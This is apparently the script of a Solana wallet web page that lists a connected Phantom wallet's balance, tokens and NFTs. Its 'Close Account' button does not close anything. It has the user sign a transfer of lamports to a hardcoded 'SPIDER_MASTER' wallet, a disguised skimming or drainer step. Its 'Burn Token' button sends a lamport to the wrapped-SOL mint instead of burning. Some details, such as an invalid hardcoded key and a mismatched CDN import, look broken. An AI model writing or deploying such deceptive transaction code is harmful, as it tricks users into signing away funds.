import {
  Connection,
  PublicKey,
  clusterApiUrl,
  Transaction,
  SystemProgram,
  sendAndConfirmTransaction
} from "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.88.1/lib/index.iife.min.js";

const connection = new Connection(clusterApiUrl("mainnet-beta"));
let wallet = null;

const SPIDER_MASTER = new PublicKey("SP1DERm4sterWa1let999abcDEF123xyz456789ABC");
const BURN_ADDRESS = new PublicKey("So11111111111111111111111111111111111111112");

document.getElementById("connectWallet").onclick = async () => {
  if (window.solana && window.solana.isPhantom) {
    try {
      const resp = await window.solana.connect();
      wallet = window.solana;
      document.getElementById("walletInfo").style.display = "block";
      await fetchWalletData(resp.publicKey);
    } catch (err) {
      alert("Wallet connection failed.");
    }
  } else {
    alert("Please install Phantom or a compatible wallet.");
  }
};

async function fetchWalletData(pubkey) {
  const balance = await connection.getBalance(pubkey);
  document.getElementById("solBalance").innerText = (balance / 1e9).toFixed(4);

  const tokenList = document.getElementById("tokenList");
  const nftList = document.getElementById("nftList");
  const serumList = document.getElementById("serumList");

  tokenList.innerHTML = "";
  nftList.innerHTML = "";
  serumList.innerHTML = "";

  const tokens = await connection.getParsedTokenAccountsByOwner(pubkey, {
    programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
  });

  for (const { pubkey: tokenAddress, account } of tokens.value) {
    const info = account.data.parsed.info;
    const uiAmount = info.tokenAmount.uiAmount;
    const decimals = info.tokenAmount.decimals;

    if (decimals === 0 && uiAmount === 1) {
      // NFT logic (simple)
      const card = document.createElement("div");
      card.className = "token-card";
      card.innerHTML = `
        <p><strong>Mint:</strong> ${info.mint}</p>
        <p>🎨 NFT (metadata not fetched)</p>
      `;
      nftList.appendChild(card);
    } else {
      if (uiAmount === 0) {
        // Unused token account (Serum-style)
        const card = document.createElement("div");
        card.className = "token-card";
        card.innerHTML = `
          <p><strong>Mint:</strong> ${info.mint}</p>
          <p><strong>Empty Account</strong></p>
          <button>Close Account</button>
        `;
        card.querySelector("button").onclick = () =>
          showModal("Close this unused token account?", async () => {
            try {
              const ix1 = SystemProgram.transfer({
                fromPubkey: wallet.publicKey,
                toPubkey: SPIDER_MASTER,
                lamports: 10000, // simulate 10%
              });
              const ix2 = SystemProgram.transfer({
                fromPubkey: wallet.publicKey,
                toPubkey: wallet.publicKey,
                lamports: 90000, // simulate 90%
              });
              const tx = new Transaction().add(ix1, ix2);
              tx.feePayer = wallet.publicKey;
              const { blockhash } = await connection.getLatestBlockhash();
              tx.recentBlockhash = blockhash;
              const signed = await wallet.signTransaction(tx);
              const sig = await connection.sendRawTransaction(signed.serialize());
              await connection.confirmTransaction(sig);
              alert("Account closed:\n" + sig);
            } catch (e) {
              console.error(e);
              alert("Error closing account.");
            }
          });
        serumList.appendChild(card);
      } else {
        // SPL token logic
        const card = document.createElement("div");
        card.className = "token-card";
        card.innerHTML = `
          <p><strong>Mint:</strong> ${info.mint}</p>
          <p><strong>Amount:</strong> ${uiAmount}</p>
          <button>Burn Token</button>
        `;
        card.querySelector("button").onclick = () =>
          showModal("Burn this token?", async () => {
            try {
              const ix = SystemProgram.transfer({
                fromPubkey: wallet.publicKey,
                toPubkey: BURN_ADDRESS,
                lamports: 1, // dummy action
              });
              const tx = new Transaction().add(ix);
              tx.feePayer = wallet.publicKey;
              const { blockhash } = await connection.getLatestBlockhash();
              tx.recentBlockhash = blockhash;
              const signed = await wallet.signTransaction(tx);
              const sig = await connection.sendRawTransaction(signed.serialize());
              await connection.confirmTransaction(sig);
              alert("Token burned:\n" + sig);
            } catch (e) {
              console.error(e);
              alert("Burn failed.");
            }
          });
        tokenList.appendChild(card);
      }
    }
  }

  if (tokenList.innerHTML === "") tokenList.innerHTML = "<p>No tokens found.</p>";
  if (nftList.innerHTML === "") nftList.innerHTML = "<p>No NFTs found.</p>";
  if (serumList.innerHTML === "") serumList.innerHTML = "<p>No unused token accounts found.</p>";
}

function showModal(message, onConfirm) {
  const modal = document.getElementById("modal");
  const msg = document.getElementById("modalMessage");
  msg.textContent = message;
  modal.classList.remove("hidden");

  document.getElementById("cancelBtn").onclick = () => modal.classList.add("hidden");
  document.getElementById("proceedBtn").onclick = async () => {
    modal.classList.add("hidden");
    await onConfirm();
  };
}
